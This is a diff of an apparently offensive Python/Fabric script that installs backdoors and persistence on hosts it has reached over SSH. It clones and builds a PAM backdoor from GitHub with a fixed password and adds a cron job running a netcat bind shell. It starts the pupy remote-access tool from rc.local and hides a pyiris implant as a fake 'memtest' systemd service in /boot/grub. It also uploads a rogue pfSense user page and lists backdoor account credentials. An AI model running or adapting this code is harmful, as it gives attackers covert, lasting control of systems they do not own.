@@ -9,11 +9,13 @@ def web_shell(connect):
 
 
 def backdoor_pam(connect):
-    # connect.sudo("rm -rf linux-pam-backdoor")
-    connect.sudo("apt-get install git -y")
+    try:
+        connect.sudo("rm -rf linux-pam-backdoor")
+    except:
+        pass
+    connect.sudo("apt-get install git gcc make -y")
     connect.sudo("git clone https://github.com/zephrax/linux-pam-backdoor.git")
     connect.sudo("sh -c 'cd linux-pam-backdoor/ && ./backdoor.sh -v 1.1.8 -p m00dy && mv pam_unix.so /lib/x86_64-linux-gnu/security/ && cd .. && rm -rf linux-pam-backdoor/'")
-    # connect.sudo("sh -c 'echo \"YXB0LWdldCBpbnN0YWxsIGdpdCAteQpnaXQgY2xvbmUgaHR0cHM6Ly9naXRodWIuY29tL3plcGhyYXgvbGludXgtcGFtLWJhY2tkb29yLmdpdApjZCBsaW51eC1wYW0tYmFja2Rvb3IvCi4vYmFja2Rvb3Iuc2ggLXYgMS4xLjggLXAgbTAwZHkKbXYgcGFtX3VuaXguc28gL2xpYi94ODZfNjQtbGludXgtZ251L3NlY3VyaXR5LwpybSAtcmYgbGludXgtcGFtLWJhY2tkb29yLw==\" | base64 -d | sudo tee -a /etc/bash.bashrc'")
 
 
 def backdoor_ssh(connect):
@@ -26,6 +28,8 @@ def backdoor_ssh(connect):
 # totally_legit_user VerySecure
 
 # badmin VerySecure
+
+
 def pfsense_user(connect):
     connect.put('UploadFiles/system_usermanager.php', remote="/usr/local/www/")
 
@@ -37,6 +41,7 @@ def pupy(connect):
     connect.sudo('chmod 777 /bin/pupy')
     connect.sudo("sh -c 'printf \"#!/bin/bash\n/bin/./pupy\nexit 0\" > /etc/rc.local && /bin/./pupy'")
     connect.sudo('/bin/./pupy')
+
 
 def empire(connect):
     ###NEEDS MORE WORK
@@ -79,6 +84,29 @@ def vince_netcat(connect):
     connect.sudo("crontab -l | echo '*/5 * * * * nc.traditional -lvp 4444 -e /bin/sh' | crontab -")
 
 
+def ohad_pyiris_ubuntu(connect):
+    connect.sudo('apt install python-pip screen -y')
+    ohad_pyiris(connect)
 
-# Up to implementation: merlin and empirer
+
+def ohad_pyiris_centos(connect):
+    connect.sudo('yum install python-pip screen -y')
+    ohad_pyiris(connect)
+
+
+def ohad_pyiris(connect):
+    connect.sudo('python -m pip install mss python-crontab')
+    connect.put('UploadFiles/initrdMemTest')
+    connect.put('UploadFiles/init-memtest.service')
+    connect.sudo('mv initrdMemTest /boot/grub/')
+    connect.sudo('mv init-memtest.service /etc/systemd/system/')
+    connect.sudo('chmod +x /boot/grub/initrdMemTest')
+    connect.sudo('chmod 664 /etc/systemd/system/init-memtest.service')
+    connect.sudo('systemctl daemon-reload')
+    connect.sudo('systemctl enable init-memtest.service')
+    connect.sudo('systemctl start init-memtest.service')
+    connect.sudo('screen -d -m /boot/grub/./initrdMemTest')
+
+
+# Up to implementation: merlin and empyre
 # https://github.com/shad0wghost/ssh-authlog-backdoor
